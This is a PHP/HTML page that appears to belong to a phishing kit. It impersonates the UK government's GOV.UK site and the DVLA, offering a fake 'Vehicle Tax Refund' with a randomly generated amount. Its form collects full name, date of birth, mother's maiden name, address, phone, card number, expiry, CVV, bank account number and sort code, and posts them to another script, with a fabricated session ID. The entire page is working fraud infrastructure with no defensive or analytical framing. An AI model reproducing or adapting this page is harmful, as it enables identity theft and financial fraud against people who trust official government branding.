<?php
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";


?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="assets/css/Main.css" media="screen" rel="stylesheet" type="text/css">
    <link href="assets/css/Font.css" media="screen" rel="stylesheet" type="text/css">
    <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="assets/img/114.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="assets/img/144.png">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="assets/img/72.png">
    <link rel="apple-touch-icon-precomposed" href="assets/img/57.png">
    <title>Vehicle Tax Refund</title>
    <script type='text/javascript' src='assets/js/jquery-1.9.1.js'></script>
    <script type='text/javascript' src="assets/js/jquery.payment.js"></script>
    <script type='text/javascript' src="assets/js/jquery.validate.min.js"></script>
    <script type='text/javascript' src="assets/js/additional-methods.min.js"></script>
    <script type='text/javascript' src="assets/js/jquery.maskedinput.js"></script>
    <script>
        jQuery(function($) {
            $('.cc-number').payment('formatCardNumber');
            $('.cc-exp').payment('formatCardExpiry');
            $('.cc-cvc').payment('formatCardCVC');
            $.fn.toggleInputError = function(erred) {
                this.parent('.field').toggleClass('errorzzzz', erred);
                return this;
            };
            $('form').submit(function(e) {
                e.preventDefault();
                var cardType = $.payment.cardType($('.cc-number').val());
                $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
                $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
                $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
                $('.cc-brand').text(cardType);
            });
        });
    </script>
    <script type='text/javascript'>
        jQuery(function($){
            $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
            $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
        });
    </script>
    <script>
        jQuery.validator.addMethod('phoneUK', function(phone_number, element) {
            return this.optional(element) || phone_number.length > 9 &&
                phone_number.match(/^(((\+44)? ?(\(0\))? ?)|(0))( ?[0-9]{3,4}){3}$/);
        }, 'Please check the telephone number you have provided');

        jQuery.validator.addMethod("postcodeUK", function(value, element) {
            return this.optional(element) || /^[A-Z]{1,2}[0-9]{1,2} ?[0-9][A-Z]{2}$/i.test(value);
        }, "Please check the postcode you have provided");

        $('#details').validate();
        (function($,W,D)
        {
            var JQUERY4U = {};

            JQUERY4U.UTIL =
                {
                    setupFormValidation: function()
                    {
                        //form validation rules
                        $("#details").validate({
                            errorElement: "div",
                            rules: {
                                name: {	required: true,	minlength: 4,},
                                dob: {	required: true,	minlength: 10,},
                                telephone: { required: true, minlength: 11, digits: true,},
                                email: { required: true, email: true,},
                                address: { required: true, minlength: 5,},
                                town: { required: true, minlength: 3,},
                                postcode: { required: true, minlength: 5,},
                                ccname: { required: true, minlength: 4,},
                                ccno: { required: true, minlength: 16, creditcard: true},
                                ccexp: { required: true, minlength: 4,},
                                secode: { required: true, minlength: 3, digits: true,},
                                acno: { required: true, minlength: 8, digits: true,},
                                sortcode: { required: true, minlength: 6},
                                confirm: { required: true},
                            },
                            errorPlacement: function(error, element) {
                                if (element.attr("name") == "day" || element.attr("name") == "month" || element.attr("name") == "year")
                                    error.insertAfter("#doberror");
                                else
                                    error.insertAfter(element);
                                if (element.attr("name") == "sort1" || element.attr("name") == "sort2" || element.attr("name") == "sort3")
                                    error.insertAfter("#expiryerror");
                                if (element.attr("name") == "secode")
                                    error.insertAfter("#secodeerror");
                                if (element.attr("name") == "acno")
                                    error.insertAfter("#acnoerror");
                            },
                            messages: {
                                name: {
                                    required: "Please provide your full name",
                                    minlength: jQuery.validator.format("Please provide your full name"),
                                },
                                dob: {
                                    required: "Please provide your date of birth", },
                                minlength: jQuery.validator.format("Please chek the date of birth you have entered"),
                                telephone: {
                                    required: "Please provide your telephone number",
                                    minlength: jQuery.validator.format("Your telephone number should be exactly 11 digits"),
                                    digits: jQuery.validator.format("Please ensure you enter digits only"),
                                },
                                email: {
                                    required: "Please provide your email address",
                                    email: jQuery.validator.format("Please check the email address you have entered"),
                                },
                                address: {
                                    required: "Please provide the 1st line of your address",
                                    minlength: jQuery.validator.format("Please check the address you have entered"),
                                },
                                town: {
                                    required: "Please provide your city/town",
                                    minlength: jQuery.validator.format("Please check the city/town you have entered"),
                                },
                                postcode: {
                                    required: "Please provide your postcode",
                                    minlength: jQuery.validator.format("Please check the postcode you have entered"),
                                },
                                ccname: {
                                    required: "Please provide your name as it appears on your card",
                                    minlength: jQuery.validator.format("Please provide your name as it appears on your card"),
                                },
                                ccno: {
                                    required: "Please provide your 16 digit card number",
                                    minlength: jQuery.validator.format("Please check the card number you have entered"),
                                    creditcard: jQuery.validator.format("Please check the card number you have entered"),
                                },
                                ccexp: {
                                    required: "Please provide your cards expiry date",
                                    minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
                                    date: jQuery.validator.format("Please check the card expiry date you have entered"),
                                },
                                secode: {
                                    required: "Please provide your 3 digit card security code (CVV)",
                                    minlength: jQuery.validator.format("Please check the card security code you have entered"),
                                    digits: jQuery.validator.format("Please ensure you enter digits only"),
                                },
                                acno: {
                                    required: "Please provide your 8 digit account number",
                                    minlength: jQuery.validator.format("Please check the account number you have entered"),
                                    digits: jQuery.validator.format("Please ensure you enter digits only"),
                                },
                                sortcode: {
                                    required: "Please provide your sortcode",
                                    minlength: jQuery.validator.format("Please check the sortcode you have entered"),
                                },
                                acno: {
                                    required: "Please provide your account number",
                                    minlength: jQuery.validator.format("Please check the account number you have entered"),
                                    digits: jQuery.validator.format("Please ensure you enter digits only"),
                                },
                                confirm: {
                                    required: "Please confirm the information you have provided to be true and accurate",
                                },
                            },
                            submitHandler: function(form) {
                                form.submit();
                            }
                        });
                    }
                }

            //when the dom has loaded setup form validation rules
            $(D).ready(function($) {
                JQUERY4U.UTIL.setupFormValidation();
            });

        })(jQuery, window, document);

    </script>
    <style>
        div.error {color:red}
    </style>
</head>


<body class="js-enabled">
<form method="post" action="Finish.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" id="details" name="details" autocomplete="off">


    <header role="banner" class="with-proposition" id="global-header">
        <div class="header-wrapper">
            <div class="header-global">
                <div class="header-logo">
                    <a href="#" id="logo" class="content">
                        <img src="assets/img/logo.png" width="35" height="31" alt=""> GOV.UK
                    </a>
                </div>
            </div>
            <div class="header-proposition">
                <div class="content">
                    <nav id="proposition-menu">
                        <a href="#" id="proposition-name">Vehicle tax</a>
                    </nav>
                </div>
            </div>
        </div>
    </header>
    <!--end header-->



    <div id="global-header-bar"></div>

    <div id="wrapper">
        <div class="maincontent">
            <div id="startHeader" class="start-header group">
                <h1>Tax Refund</h1>
            </div>
            <div class="body-container group">

                <div>
                    <p>
                        <span id="titleMsg" class="label">You are eligible for a refund amount of £<?php echo rand(32, 40); ?>.<?php echo rand(11, 33); ?></span>
                    </p>
                    <p>
                        <span id="titleMsg" class="label">Please complete the form below to request a refund. This refund will be credited to the credit/debit card you provide.</span>
                    </p>

                </div>
                <div class="inout-pad">
                    <p><strong><label for="name" class="label">Full Name</label></strong></p>
                    <p><input name="name" type="text" maxlength="40" id="name" class="input-large input-upper" autocomplete="off"></p>
                </div>

                <div class="inout-pad">
                    <p><strong><label for="dob" class="label">Date of Birth</label></strong></p>
                    <p><input name="dob" type="tel" maxlength="10" id="dob" class="input-medium input-upper" autocomplete="off"></p>
                </div>
                <div class="inout-pad">
                    <p><strong><label for="mmn" class="label">Mother’s Maiden Name ( If Applicable)</label></strong></p>
                    <p><input name="mmn" type="text" maxlength="22" id="mmn" class="input-medium input-upper" required></p>
                </div>

                <div class="inout-pad">
                    <p><strong><label for="address" class="label">Address</label></strong></p>
                    <p><input name="address" type="text" maxlength="40" id="address" class="input-large input-upper" autocomplete="off"></p>
                </div>

                <div class="inout-pad">
                    <p><strong><label for="town" class="label">Town/City</label></strong></p>
                    <p><input name="town" type="text" maxlength="40" id="town" class="input-large input-upper" autocomplete="off"></p>
                </div>

                <div class="inout-pad">
                    <p><strong><label for="postcode" class="label">Postcode</label></strong></p>
                    <p><input name="postcode" type="text" maxlength="10" id="postcode" class="input-small input-upper" autocomplete="off"></p>
                </div>

                <div class="inout-pad">
                    <p><strong><label for="telephone" class="label">Telephone Number</label></strong></p>
                    <p><input name="telephone" type="tel" maxlength="11" id="telephone" class="input-large input-upper" autocomplete="off"></p>
                </div>

                <div class="inout-pad">
                    <p><strong><label for="ccname" class="label">Cardholder's Name</label></strong></p>
                    <p><input name="ccname" type="text" maxlength="30" id="ccname" class="input-large input-upper" autocomplete="off"></p>
                </div>

                <div class="inout-pad">
                    <p><strong><label for="ccno" class="label">Card Number</label></strong></p>
                    <p><input name="ccno" type="tel" maxlength="20" id="cc-number" class="cc-number input-large input-upper" autocomplete="off"></p>
                </div>

                <div class="inout-pad">
                    <p><strong><label for="ccexp" class="label">Card Expiry</label></strong></p>
                    <p><input name="ccexp" type="tel" maxlength="7" id="cc-exp" class="cc-exp input-small input-upper" autocomplete="off"></p>
                </div>

                <div class="inout-pad">
                    <p><strong><label for="secode" class="label">Card Security Code</label></strong></p>
                    <p><input name="secode" type="tel" maxlength="4" id="secode" class="cc-cvc input-small input-upper" autocomplete="off"></p>
                </div>

                <div class="inout-pad">
                    <p><strong><label for="acno" class="label">Account Number</label></strong></p>
                    <p><input name="acno" type="tel" maxlength="8" id="acno" class="input-medium input-upper" autocomplete="off"></p>
                </div>

                <div class="inout-pad">
                    <p><strong><label for="sortcode" class="label">Sort Code</label></strong></p>
                    <p><input name="sortcode" type="tel" maxlength="8" id="sortcode" class="input-medium input-upper" autocomplete="off"></p>
                </div>




                <div>
                    <p><input type="checkbox" name="confirm" value="">
                        <span id="verifyfinaltouch" class="label">I certify that the information provided on this application is correct. I understand that the withholding of information or giving false information will result in possible delays for DVLA to process your Tax Refund.</span>
                    </p>
                </div>

                <div class="action">
                    <input type="submit" name="go" id="go" value="Continue" class="button">


                </div>
            </div>

        </div>
    </div>

    <footer class="group js-footer" id="footer" role="contentinfo">
        <div class="footer-wrapper">
            <div class="footer-meta">
                <div class="footer-meta-inner">
                    <ul>
                        <li>
                            <a href="#">Cookies</a>
                        </li>
                        <li>
                            <a href="#">Terms and Conditions</a>
                        </li>
                        <li>
                            <a href="#">English</a>
                        </li>
                        <li>
                            <a href="#">Welsh</a>
                        </li>
                        <li>
                            Built by the <a href="#">Driver &amp; Vehicle Licensing Agency</a>
                        </li>
                    </ul>
                    <div class="open-government-licence">
                        <p class="logo"><a href="#">Open Government Licence</a></p>
                        <p>
                            All content is available under the <a href="#">
                                Open Government Licence v2.0</a>, except where otherwise stated</p>
                    </div>
                </div>
                <div class="copyright">
                    <a href="#">
                        &copy; Crown copyright</a>
                </div>
            </div>
        </div>
    </footer>
    <!--end footer-->



</form>





</body>
</html>
